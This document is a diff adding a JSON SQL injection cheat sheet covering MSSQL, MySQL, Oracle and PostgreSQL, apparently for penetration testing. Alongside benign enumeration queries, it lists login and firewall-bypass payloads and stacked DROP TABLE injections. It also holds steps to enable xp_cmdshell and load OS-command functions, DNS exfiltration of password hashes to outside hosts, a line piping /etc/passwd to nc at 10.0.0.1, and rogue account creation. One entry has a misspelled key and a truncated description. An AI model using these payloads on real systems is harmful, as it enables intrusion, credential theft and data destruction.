@@ -1,0 +1,916 @@
+{
+  "MSSQL": {
+    "queries": [
+      {
+        "name": "Version",
+        "command": "SELECT @@VERSION;",
+        "description": "Obtiene la versión del sistema operativo/Windows"
+      },
+      {
+        "name": "List Users",
+        "command": "SELECT name FROM master..syslogins;",
+        "description": "Lista los nombres de usuarios de la tabla master..syslogins"
+      },
+      {
+        "name": "Current User",
+        "commands": [
+          {
+            "command": "SELECT user_name();",
+            "description": "Obtiene el nombre del usuario recientemente autenticado"
+          },
+          {
+            "command": "SELECT system_user;",
+            "description": "Obtiene el valor actual de system_user"
+          },
+          {
+            "command": "SELECT user;",
+            "description": "Obtiene el nombre del usuario impersonificado"
+          },
+          {
+            "command": "SELECT loginname FROM master.sysprocesses WHERE spid = @@SPID;",
+            "description": "Obtiene el nombre de login de la tabla master.sysprocesses"
+          }
+        ]
+      },
+      {
+        "name": "List all Databases",
+        "commands": [
+          {
+            "command": "SELECT name FROM master.sysdatabases;",
+            "description": "Lista todas las bases de datos desde master.sysdatabases"
+          },
+          {
+            "command": "SELECT DB_NAME(N);",
+            "description": "Obtiene el nombre de la base de datos en la posición N (N=0,1,2,3,...)"
+          }
+        ]
+      },
+      {
+        "name": "Current Database",
+        "command": "SELECT DB_NAME();",
+        "description": "Obtiene la base de datos actual"
+      },
+      {
+        "name": "Database length",
+        "commad": "SELECT LENGTH(DB_NAME());",
+        "description": "Se cal"
+      },
+      {
+        "name": "List Tables",
+        "command": "SELECT name FROM sysobjects WHERE xtype = 'U';",
+        "description": "Obtiene los nombres de tablas donde xtype = 'U' (tablas de usuario)"
+      },
+      {
+        "name": "Column Names",
+        "commands": [
+          {
+            "command": "SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'tablename');",
+            "description": "Obtiene nombres de columnas para una tabla específica (solo base de datos actual)"
+          },
+          {
+            "command": "SELECT master.syscolumns.name, TYPE_NAME(master.syscolumns.xtype) FROM master.syscolumns, master.sysobjects WHERE master.syscolumns.id = master.sysobjects.id AND master.sysobjects.name = 'sometable';",
+            "description": "Obtiene nombres y tipos de columnas globalmente (ajustar nombre de BD y tabla)"
+          }
+        ]
+      },
+      {
+        "name": "Select Nth Row",
+        "command": "SELECT TOP 1 name FROM (SELECT TOP 9 name FROM master..syslogins ORDER BY name ASC) sq ORDER BY name DESC;",
+        "description": "Obtiene la fila número 9 (ajustar TOP para diferentes posiciones)"
+      },
+      {
+        "name": "Extract part of a string",
+        "command": "SELECT substring('abcd', 3, 1);",
+        "description": "Obtiene el carácter en la posición N (en este caso, 'c')"
+      },
+      {
+        "name": "Conditional Statements",
+        "commands": [
+          {
+            "command": "IF (1=1) SELECT 1 ELSE SELECT 2;",
+            "description": "Ejemplo de declaración IF (retorna 1)"
+          },
+          {
+            "command": "SELECT CASE WHEN 1=1 THEN 1 ELSE 2 END;",
+            "description": "Ejemplo de declaración CASE (retorna 1)"
+          }
+        ]
+      },
+      {
+        "name": "Comments",
+        "commands": [
+          {
+            "command": "SELECT 1; -- comentario",
+            "description": "Comentario de línea simple"
+          },
+          {
+            "command": "SELECT /*comentario*/1;",
+            "description": "Comentario en bloque"
+          }
+        ]
+      },
+      {
+        "name": "String without Quotes",
+        "command": "SELECT CHAR(75)+CHAR(76)+CHAR(77);",
+        "description": "Construye strings sin usar comillas (retorna 'KLM')"
+      },
+      {
+        "name": "Time Delay",
+        "command": "WAITFOR DELAY '0:0:5';",
+        "description": "Pausa la ejecución por 5 segundos"
+      },
+      {
+        "name": "Command Execution",
+        "command": "EXEC xp_cmdshell 'net user';",
+        "description": "Ejecuta comandos del sistema operativo (requiere privilegios)",
+        "privileged": true,
+        "activation": [
+          "EXEC sp_configure 'show advanced options', 1;",
+          "RECONFIGURE;",
+          "EXEC sp_configure 'xp_cmdshell', 1;",
+          "RECONFIGURE;"
+        ]
+      },
+      {
+        "name": "DNS Requests",
+        "commands": [
+          {
+            "command": "DECLARE @host VARCHAR(800); SELECT @host = name FROM master..syslogins; EXEC('master..xp_getfiledetails \"' + @host + 'c$boot.ini\"');",
+            "description": "Realiza solicitudes DNS usando xp_getfiledetails"
+          },
+          {
+            "command": "DECLARE @host VARCHAR(800); SELECT @host = name + '-' + master.sys.fn_varbintohexstr(password_hash) + '.2.pentestmonkey.net' FROM sys.sql_logins; EXEC('xp_fileexist \"' + @host + 'c$boot.ini\"');",
+            "description": "Realiza solicitudes DNS usando xp_fileexist (concatenación mediante variable)"
+          }
+        ]
+      },
+      {
+        "name": "List Passwords",
+        "commands": [
+          {
+            "command": "SELECT name, password FROM master..sysxlogins;",
+            "description": "Obtiene las columnas 'name' y 'password' de la tabla 'master..sysxlogins'. Solo funciona en MSSQL 2000."
+          },
+          {
+            "command": "SELECT name, password_hash FROM master.sys.sql_logins;",
+            "description": "Obtiene las columnas 'name' y 'password_hash' de la tabla 'master.sys.sql_logins'. Solo funciona en MSSQL 2005."
+          }
+        ]
+      }
+    ],
+    "injection_payloads": {
+      "login_bypass": [
+        "admin'--",
+        "admin'#", 
+        "admin'/*",
+        "'or 1=1--",
+        "'or 1=1#",
+        "'or 1=1/*",
+        "')or '1'='1--",
+        "')or ('1'='1--"
+      ],
+      "admin_panel_bypass": [
+        "'or 1=1--",
+        "1'or'1'='1",
+        "admin'--",
+        "\"or 0=0--",
+        "or 0=0--",
+        "'or 0=0#",
+        "\"or 0=0#",
+        "or 0=0#",
+        "'or 'x'='x",
+        "\"or \"x\"='x",
+        "')or ('x'='x",
+        "'or 1=1--",
+        "\"or 1=1--",
+        "or 1=1--"
+      ],
+      "md5_hash_bypass": [
+        "1234' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055' --",
+        "Username: admin Password: 1234' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'"
+      ]
+    },
+    "advanced_injection": {
+      "stacked_queries": [
+        "ProductID=1; DROP members--",
+        "'; DROP TABLE sampletable;--",
+        "'; DROP TABLE sampletable;#"
+      ],
+      "union_injections": [
+        "SELECT header, txt FROM news UNION ALL SELECT name, pass FROM members --",
+        "' UNION SELECT 1, 'anotheruser', 'doesntmatter', 1--",
+        "SELECT header, txt FROM news UNION ALL SELECT name, pass FROM members WHERE '1'='1'"
+      ],
+      "admin_login": [
+        "admin'--",
+        "SELECT * FROM members WHERE username='admin'--' AND password='password'"
+      ]
+    },
+    "firewall_bypass": {
+      "normalization_method": [
+        "/?id=1/*union*/union/*select*/select+1,2,3/*"
+      ],
+      "hpp_technique": [
+        "/?id=1;select+1&id=2,3+from+users+where+id=1--"
+      ],
+      "hpf_technique": [
+        "/?a=1+union/*&b=*/select+1,2",
+        "/?a=1+union/*&b=*/select+1,pass/*&c=*/ from+users--"
+      ],
+      "blind_injection": [
+        "/?id=1+OR+0x50=0x50",
+        "/?id=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74"
+      ],
+      "signature_bypass": [
+        "/?id=1+union+(select+xz*from+xxx)",
+        "/?id=(1)union(select(1),mid(hash,1,32)from(users))",
+        "/?id=1+union+(select'1',concat(login,hash)from+users)",
+        "/?id=(1)union(((((((select(1),hex(hash)from(users))))))))",
+        "/?id=xx(1)or(0x50=0x50)"
+      ],
+      "buffer_overflow": [
+        "?page_id=null%0A/**//*150000%55nIOn*//*yoyu*/all/**%0A/**%53eLECt*/%0A/*nnaa*/+1,2,3,4..."
+      ]
+    },
+    "enumeration_techniques": {
+      "database_enumeration": [
+        "' and 1 in (select min(name) from master.dbo.sysdatabases where name >'.') --"
+      ],
+      "file_enumeration": [
+        "' and 1 in (select min(filename) from master.dbo.sysdatabases where filename >'.') --"
+      ],
+      "table_column_enumeration": [
+        "' union select 0, sysobjects.name + '.' + syscolumns.name + '.' + systypes.name, 1, 1, '1', 1, 1, 1, 1, 1 from sysobjects, syscolumns, systypes where sysobjects.xtype = 'U' AND sysobjects.id = syscolumns.id AND syscolumns.xtype = systypes.xtype --"
+      ]
+    }
+  },
+  "MYSQL": {
+    "queries": [
+      {
+        "name": "Version",
+        "commands": [
+          {
+            "command": "SELECT @@VERSION;",
+            "description": "Retrieves the system information of the current installation of SQL Server"
+          },
+          {
+            "command": "SELECT version();",
+            "description": "Selects the specific version of a Server"
+          }
+        ]
+      },
+      {
+        "name": "List Users",
+        "command": "SELECT user FROM mysql.user;",
+        "description": "Lists the column 'user' from the table 'mysql.user'"
+      },
+      {
+        "name": "Current User",
+        "commands": [
+          {
+            "command": "SELECT user();",
+            "description": "Obtains the current MySQL user name and hostname"
+          },
+          {
+            "command": "SELECT system_user();",
+            "description": "Obtains the current value of system_user"
+          }
+        ]
+      },
+      {
+        "name": "List all Databases",
+        "commands": [
+          {
+            "command": "SELECT schema_name FROM information_schema.schemata;",
+            "description": "Obtains schema_name column with list of databases from schemata table (MySQL >= v5.0)"
+          },
+          {
+            "command": "SELECT distinct(db) FROM mysql.db;",
+            "description": "Lists distinct databases from mysql.db table (privileged)",
+            "privileged": true
+          }
+        ]
+      },
+      {
+        "name": "Current Database",
+        "command": "SELECT database();",
+        "description": "Obtains the current MySQL database"
+      },
+      {
+        "name": "Input Validation Circumvention using Char()",
+        "commands": [
+          {
+            "command": "'or username like char(37);",
+            "description": "Injects without quotes (string = \"%\")"
+          },
+          {
+            "command": "'union select * from users where login = char(114,111,111,116);",
+            "description": "Injects with quotes (string=\"root\")"
+          },
+          {
+            "command": "'union select 1,load_file(char(47,101,116,99,47,112,97,115,115,119,100)),1,1,1;",
+            "description": "Loads files in unions (string = \"/etc/passwd\")"
+          },
+          {
+            "command": "'and 1=(if(load_file(char(110,46,101,120,116))<>char(39,39),1,0));",
+            "description": "Checks for existing files (string = \"n.ext\")"
+          }
+        ]
+      },
+      {
+        "name": "List Tables",
+        "command": "SELECT table_name FROM information_schema.tables WHERE table_schema = 'tblUsers';",
+        "description": "Obtains table_name column from information_schema.tables for specific schema"
+      },
+      {
+        "name": "Column Names",
+        "commands": [
+          {
+            "command": "SELECT table_name, column_name FROM information_schema.columns WHERE table_schema = 'tblUsers';",
+            "description": "Obtains table_name and column_name from information_schema.columns for specific schema"
+          },
+          {
+            "command": "SELECT table_schema, table_name FROM information_schema.columns WHERE column_name = 'username';",
+            "description": "Finds tables containing a specific column name"
+          }
+        ]
+      },
+      {
+        "name": "Select Nth Row",
+        "commands": [
+          {
+            "command": "SELECT host, user FROM user ORDER BY host LIMIT 1 OFFSET 0;",
+            "description": "Returns first row (rows numbered from 0)"
+          },
+          {
+            "command": "SELECT host, user FROM user ORDER BY host LIMIT 1 OFFSET 1;",
+            "description": "Returns second row (rows numbered from 0)"
+          }
+        ]
+      },
+      {
+        "name": "Select Nth Char",
+        "command": "SELECT substr('abcd', 3, 1);",
+        "description": "Returns the character at position N (returns 'c')"
+      },
+      {
+        "name": "If Statement",
+        "command": "SELECT if(1=1,'foo','bar');",
+        "description": "Conditional if statement (returns 'foo')"
+      },
+      {
+        "name": "Case Statement",
+        "command": "SELECT CASE WHEN (1=1) THEN 'A' ELSE 'B' END;",
+        "description": "Case statement (returns 'A')"
+      },
+      {
+        "name": "Comments",
+        "commands": [
+          {
+            "command": "SELECT 1; #comment",
+            "description": "Single line comment"
+          },
+          {
+            "command": "SELECT /*comment*/1;",
+            "description": "Block comment"
+          }
+        ]
+      },
+      {
+        "name": "String without Quotes",
+        "command": "SELECT CONCAT(CHAR(75),CHAR(76),CHAR(77));",
+        "description": "Constructs strings without quotes (returns 'KLM')"
+      },
+      {
+        "name": "Time Delay",
+        "commands": [
+          {
+            "command": "SELECT BENCHMARK(1000000,MD5('A'));",
+            "description": "Triggers a measurable time delay"
+          },
+          {
+            "command": "SELECT SLEEP(5);",
+            "description": "Pauses execution for 5 seconds (MySQL >= 5.0.12)"
+          }
+        ]
+      },
+      {
+        "name": "Command Execution",
+        "description": "If mysqld (<5.0) is running as root AND you compromise a DBA account you can execute OS commands by uploading a shared object file into /usr/lib (or similar). The .so file should contain a User Defined Function (UDF). raptor_udf.c explains exactly how you go about this. Remember to compile for the target architecture.",
+        "privileged": true,
+        "requirements": [
+          "mysqld running as root",
+          "DBA account compromised",
+          "Ability to upload shared object files"
+        ]
+      },
+      {
+        "name": "DNS Exfiltration",
+        "commands": [
+          {
+            "command": "select load_file(concat('\\\\',version(),'.hacker.site\\\\a.txt'));",
+            "description": "Extracts data like password hashes from DNS requests"
+          },
+          {
+            "command": "select load_file(concat(0x5c5c5c5c5c,version(),0x2e6861636b65722e736974655c5c612e747874));",
+            "description": "Hex-encoded version of DNS exfiltration"
+          }
+        ]
+      },
+      {
+        "name": "Load File",
+        "commands": [
+          {
+            "command": "'UNION ALL SELECT LOAD_FILE('/etc/passwd') --",
+            "description": "Shows content of /etc/passwd file"
+          },
+          {
+            "command": "SELECT LOAD_FILE(0x633A5C626F6F742E696E69);",
+            "description": "Shows content of c:\\boot.ini (hex encoded)"
+          }
+        ]
+      },
+      {
+        "name": "Log in as Admin User",
+        "commands": [
+          {
+            "command": "DROP sampletable;--",
+            "description": "Example of stacked query with comment"
+          },
+          {
+            "command": "DROP sampletable;#",
+            "description": "Example of stacked query with comment"
+          },
+          {
+            "command": "admin'--",
+            "description": "Basic admin login bypass"
+          },
+          {
+            "command": "admin' or '1'='1'--",
+            "description": "Admin login with always-true condition"
+          },
+          {
+            "command": "SELECT * FROM members WHERE username = 'admin'--' AND password = 'password';",
+            "description": "SQL query vulnerable to comment-based injection"
+          }
+        ]
+      },
+      {
+        "name": "List Passwords",
+        "commands": [
+          {
+            "command": "SELECT user, password FROM mysql.user;",
+            "description": "Retrieves user and password columns from mysql.user"
+          },
+          {
+            "command": "SELECT user, password FROM mysql.user LIMIT 1,1;",
+            "description": "Retrieves specific row from mysql.user with limit"
+          },
+          {
+            "command": "SELECT password FROM mysql.user WHERE user = 'root';",
+            "description": "Retrieves password for root user"
+          }
+        ]
+      },
+      {
+        "name": "List Password Hashes",
+        "command": "SELECT host, user, password FROM mysql.user;",
+        "description": "Lists host, user and password hash columns from mysql.user"
+      },
+      {
+        "name": "Bulk Insert",
+        "command": "SELECT * FROM mytable INTO dumpfile '/tmp/somefile';",
+        "description": "Inserts file content to a table (privileged operation)",
+        "privileged": true
+      },
+      {
+        "name": "Create Users",
+        "command": "CREATE USER username IDENTIFIED BY 'password';",
+        "description": "Creates a new database user",
+        "privileged": true
+      },
+      {
+        "name": "Create DB Accounts",
+        "command": "INSERT INTO mysql.user (user, host, password) VALUES ('name', 'localhost', PASSWORD('pass123'));",
+        "description": "Creates database account by direct insertion",
+        "privileged": true
+      },
+      {
+        "name": "Drop User",
+        "command": "DROP USER username;",
+        "description": "Drops a user from the database",
+        "privileged": true
+      },
+      {
+        "name": "List Engines",
+        "command": "SHOW ENGINES;",
+        "description": "Displays a list of storage engines supported by the MySQL server"
+      },
+      {
+        "name": "List Privileges for User",
+        "command": "SHOW GRANTS FOR 'username'@'localhost';",
+        "description": "Shows the privileges granted to a specified user"
+      },
+      {
+        "name": "Find Process List",
+        "command": "SHOW PROCESSLIST;",
+        "description": "Displays a list of currently running threads on the MySQL server"
+      },
+      {
+        "name": "OS Interaction",
+        "commands": [
+          {
+            "command": "' union select 1,load_file('/etc/passwd'),1,1,1;",
+            "description": "Malicious query used to interact with a target OS (file read)"
+          },
+          {
+            "command": "CREATE FUNCTION sys_exec RETURNS int SONAME 'libudffmwgi.dll';",
+            "description": "Creates function for OS command execution"
+          },
+          {
+            "command": "CREATE FUNCTION sys_eval RETURNS string SONAME 'libudffmwgi.dll';",
+            "description": "Creates function for OS command evaluation"
+          }
+        ]
+      },
+      {
+        "name": "Creating Database Accounts",
+        "commands": [
+          {
+            "command": "INSERT INTO mysql.user (user, host, password) VALUES ('victor', 'localhost', PASSWORD('Pass123'));",
+            "description": "Malicious query used to create database accounts",
+            "privileged": true
+          }
+        ]
+      }
+    ]
+  },
+  "ORACLE": {
+    "queries": [
+      {
+        "name": "Version",
+        "commands": [
+          {
+            "command": "SELECT banner FROM v$version WHERE banner LIKE 'Oracle%';",
+            "description": "Obtains Oracle version and build information"
+          },
+          {
+            "command": "SELECT version FROM v$instance;",
+            "description": "Displays current database information such as host name, status, startup time, etc."
+          }
+        ]
+      },
+      {
+        "name": "List Users",
+        "commands": [
+          {
+            "command": "SELECT username FROM all_users ORDER BY username;",
+            "description": "Obtains column 'username' from table 'all_users' sorted by username"
+          },
+          {
+            "command": "SELECT name FROM sys.user$;",
+            "description": "Obtains column 'name' from table 'sys.user$'"
+          }
+        ]
+      },
+      {
+        "name": "Current User",
+        "command": "SELECT user FROM dual;",
+        "description": "Obtains current user from the table 'dual'"
+      },
+      {
+        "name": "List all Databases",
+        "commands": [
+          {
+            "command": "SELECT DISTINCT owner FROM all_tables;",
+            "description": "Lists schemas (one per user)"
+          },
+          {
+            "command": "tnscmd services | status",
+            "description": "Queries TNS listener for other databases"
+          }
+        ]
+      },
+      {
+        "name": "Current Database",
+        "commands": [
+          {
+            "command": "SELECT global_name FROM global_name;",
+            "description": "Obtains current database name from global_name"
+          },
+          {
+            "command": "SELECT name FROM v$database;",
+            "description": "Obtains current database name from column 'name' in table 'v$database'"
+          },
+          {
+            "command": "SELECT instance_name FROM v$instance;",
+            "description": "Obtains column 'instance_name' from table 'v$instance'"
+          }
+        ]
+      },
+      {
+        "name": "List Tables",
+        "commands": [
+          {
+            "command": "SELECT SYS.DATABASE_NAME FROM DUAL;",
+            "description": "Obtains database name 'SYS.DATABASE' from table 'DUAL'"
+          },
+          {
+            "command": "SELECT table_name FROM all_tables;",
+            "description": "Obtains column 'table_name' from table 'all_tables'"
+          },
+          {
+            "command": "SELECT owner, table_name FROM all_tables;",
+            "description": "Obtains columns 'owner' and 'table_name' from table 'all_tables'"
+          }
+        ]
+      },
+      {
+        "name": "Column Names",
+        "commands": [
+          {
+            "command": "SELECT column_name FROM all_tab_columns WHERE table_name = 'blah';",
+            "description": "Obtains column 'column_name' from table 'all_tab_columns' where table_name = 'blah'"
+          },
+          {
+            "command": "SELECT column_name FROM all_tab_columns WHERE table_name = 'blah' and owner = 'foo';",
+            "description": "Obtains column 'column_name' from table 'all_tab_columns' where table_name = 'blah' and owner = 'foo'"
+          }
+        ]
+      },
+      {
+        "name": "Select Nth Row",
+        "command": "SELECT username FROM (SELECT ROWNUM r, username FROM all_users ORDER BY username) WHERE r=9;",
+        "description": "Retrieves 9th row (rows numbered from 1)"
+      },
+      {
+        "name": "Extract part of a string",
+        "command": "SELECT substr('abcd', 3, 1) FROM dual;",
+        "description": "Retrieves 3rd character, 'c'"
+      },
+      {
+        "name": "If Statement",
+        "command": "BEGIN IF 1=1 THEN dbms_lock.sleep(3); ELSE dbms_lock.sleep(0); END IF; END;",
+        "description": "Conditional time delay - sleeps 3 seconds if true, 0 if false. Does not work well for SELECT statements."
+      },
+      {
+        "name": "Create DB Accounts",
+        "command": "CREATE USER victor IDENTIFIED BY Pass123 TEMPORARY TABLESPACE temp DEFAULT TABLESPACE users; GRANT CONNECT TO victor; GRANT RESOURCE TO victor;",
+        "description": "Creates database accounts with privileges",
+        "privileged": true
+      }
+    ]
+  },
+  "POSTGRESQL": {
+    "queries": [
+      {
+        "name": "Version",
+        "command": "SELECT version();",
+        "description": "Obtains the version and build information of the database"
+      },
+      {
+        "name": "List Users",
+        "command": "SELECT usename FROM pg_user;",
+        "description": "Obtains the column 'usename' from the table 'pg_user'"
+      },
+      {
+        "name": "Current User",
+        "commands": [
+          {
+            "command": "SELECT user;",
+            "description": "Obtains a name of recently logged in user"
+          },
+          {
+            "command": "SELECT current_user;",
+            "description": "Obtains a name of current user"
+          },
+          {
+            "command": "SELECT session_user;",
+            "description": "Obtains a name of current session user"
+          },
+          {
+            "command": "SELECT username FROM pg_user;",
+            "description": "Obtains the column 'username' from table 'pg_user'"
+          },
+          {
+            "command": "SELECT getpgusername();",
+            "description": "Obtains the user name in current session"
+          }
+        ]
+      },
+      {
+        "name": "List all Databases",
+        "command": "SELECT datname FROM pg_database;",
+        "description": "Obtains the list of database in column 'database' from table 'pg_database'"
+      },
+      {
+        "name": "Current Database",
+        "command": "SELECT current_database();",
+        "description": "Obtains the current database"
+      },
+      {
+        "name": "Load File",
+        "command": "SELECT pg_read_file('global/pg_hba.conf',0,10000000);",
+        "description": "Used to read only the content of the DATA directory"
+      },
+      {
+        "name": "List Tables",
+        "command": "SELECT c.relname FROM pg_catalog.pg_class c LEFT JOIN pg_catalog.pg_namespace n ON n.oid = c.relnamespace WHERE c.relkind IN ('r','') AND n.nspname NOT IN ('pg_catalog', 'pg_toast') AND pg_catalog.pg_table_is_visible(c.oid);",
+        "description": "Lists the tables present in the database"
+      },
+      {
+        "name": "List Columns",
+        "command": "SELECT relname, A.attname FROM pg_class C, pg_namespace N, pg_attribute A, pg_type T WHERE (C.relkind='r') AND (N.oid=C.relnamespace) AND (A.attrelid=C.oid) AND (A.atttypid=T.oid) AND (A.attnum>0) AND (NOT A.attisdropped) AND (N.nspname ILIKE 'public');",
+        "description": "Lists the columns present in the database"
+      },
+      {
+        "name": "Select Nth Row",
+        "commands": [
+          {
+            "command": "SELECT username FROM pg_user ORDER BY usename LIMIT 1 OFFSET 0;",
+            "description": "Returns rows numbered from 0"
+          },
+          {
+            "command": "SELECT username FROM pg_user ORDER BY usename LIMIT 1 OFFSET 1;",
+            "description": "Returns rows numbered from 1"
+          }
+        ]
+      },
+      {
+        "name": "Extract part of a string",
+        "command": "SELECT substr('abcd', 3, 1);",
+        "description": "Returns the character at position N (returns 'c')"
+      },
+      {
+        "name": "Case Statement",
+        "command": "SELECT CASE WHEN (1=1) THEN 'A' ELSE 'B' END;",
+        "description": "Conditional case statement (returns 'A')"
+      },
+      {
+        "name": "Comments",
+        "commands": [
+          {
+            "command": "SELECT 1; --",
+            "description": "Single line comment"
+          },
+          {
+            "command": "SELECT /*comment*/1;",
+            "description": "Block comment"
+          }
+        ]
+      },
+      {
+        "name": "String without Quotes",
+        "command": "SELECT (CHAR(75) || CHAR(76) || CHAR(77));",
+        "description": "Constructs strings without quotes (returns 'KLM')"
+      },
+      {
+        "name": "Time Delay",
+        "commands": [
+          {
+            "command": "SELECT pg_sleep(10);",
+            "description": "Triggers a measurable sleep time (PostgreSQL 8.2+ only)"
+          },
+          {
+            "command": "CREATE OR REPLACE FUNCTION sleep(int) RETURNS int AS '/lib/libc.so.6', 'sleep' language 'C' STRICT; SELECT sleep(10);",
+            "description": "Creates a custom sleep function"
+          }
+        ]
+      },
+      {
+        "name": "Command Execution",
+        "commands": [
+          {
+            "command": "CREATE OR REPLACE FUNCTION system(string) RETURNS int AS '/lib/libc.so.6', 'system' LANGUAGE 'C' STRICT;",
+            "description": "Creates system command execution function (privileged)",
+            "privileged": true
+          },
+          {
+            "command": "SELECT system('cat /etc/passwd | nc 10.0.0.1 8080');",
+            "description": "Executes OS-level commands as postgres/pgsql user",
+            "privileged": true
+          }
+        ]
+      },
+      {
+        "name": "Make DNS Requests",
+        "command": "SELECT * FROM dblink('host=put.your.hostname.here user=someuser dbname=somedb', 'SELECT version()') RETURNS (result TEXT);",
+        "description": "Resolves hostnames using dblink (requires contrib/dblinks installed and DBA rights)",
+        "privileged": true
+      },
+      {
+        "name": "Remote Authentication",
+        "command": "host all all 192.168.20.0/24 md5;",
+        "description": "Add host record to pg_hba.conf file for remote authentication"
+      },
+      {
+        "name": "List Passwords",
+        "command": "SELECT pg_read_file('global/pg_auth',0,10000000);",
+        "description": "Lists passwords from a given database"
+      },
+      {
+        "name": "List Password Hashes",
+        "command": "SELECT usename, passwd FROM pg_shadow;",
+        "description": "Obtains password hashes from a given database"
+      },
+      {
+        "name": "Bulk Insert",
+        "commands": [
+          {
+            "command": "CREATE TABLE temptable(t text); COPY temptable FROM 'c:/boot.ini'; SELECT * FROM temptable LIMIT 1 OFFSET 0;",
+            "description": "Reads file contents into temporary table (requires permissions)"
+          },
+          {
+            "command": "DROP TABLE temptable;",
+            "description": "Drops the temporary file after exploitation"
+          }
+        ]
+      },
+      {
+        "name": "Create Users",
+        "commands": [
+          {
+            "command": "CREATE USER test1 PASSWORD 'pass1';",
+            "description": "Creates a user with password",
+            "privileged": true
+          },
+          {
+            "command": "CREATE USER test1 PASSWORD 'pass1' CREATEUSER;",
+            "description": "Creates a user with password and privileges",
+            "privileged": true
+          }
+        ]
+      },
+      {
+        "name": "Drop User",
+        "command": "DROP USER test1;",
+        "description": "Drops a user",
+        "privileged": true
+      },
+      {
+        "name": "List DBA Accounts",
+        "command": "SELECT usename FROM pg_user WHERE usesuper IS TRUE;",
+        "description": "Obtains a list of user names with DBA privileges"
+      },
+      {
+        "name": "Make User DBA",
+        "command": "ALTER USER test1 CREATEUSER CREATEDB;",
+        "description": "Grants DBA privileges to a user",
+        "privileged": true
+      },
+      {
+        "name": "Time Based SQLi Exploitation",
+        "command": "?vulnerableParam=-1; SELECT CASE WHEN (COALESCE(ASCII(SUBSTR(({INJECTION}),1,1)),0) > 100) THEN pg_sleep(14) ELSE pg_sleep(0) END LIMIT 1--+;",
+        "description": "Time-based SQL injection template (replace {INJECTION} with query)"
+      },
+      {
+        "name": "Default Databases",
+        "description": "template0, template1"
+      },
+      {
+        "name": "Path of DB Files",
+        "commands": [
+          {
+            "command": "SELECT current_setting('data_directory');",
+            "description": "Returns the path of data_directory"
+          },
+          {
+            "command": "SELECT current_setting('hba_file');",
+            "description": "Returns the path of hba_file"
+          }
+        ]
+      },
+      {
+        "name": "Privileges",
+        "command": "SELECT username, usecreatedb, usesuper, usecatupd FROM pg_user;",
+        "description": "Returns user names along with their privileges"
+      },
+      {
+        "name": "Find Active Locks",
+        "command": "SELECT * FROM pg_locks;",
+        "description": "Displays information about active locks in the database"
+      },
+      {
+        "name": "List Indexes",
+        "command": "SELECT indexname FROM pg_indexes WHERE schemaname = 'public';",
+        "description": "Lists all indexes in the public schema"
+      },
+      {
+        "name": "List Triggers",
+        "command": "SELECT tgname FROM pg_trigger WHERE NOT tgisinternal;",
+        "description": "Lists all non-internal triggers in the database"
+      },
+      {
+        "name": "Current Database Size",
+        "command": "SELECT pg_size_pretty(pg_database_size(current_database()));",
+        "description": "Displays the size of the current database in human-readable format"
+      },
+      {
+        "name": "Create DB Accounts",
+        "command": "CREATE USER victor WITH PASSWORD 'pass123';",
+        "description": "Creates database accounts",
+        "privileged": true
+      }
+    ]
+  }
+}
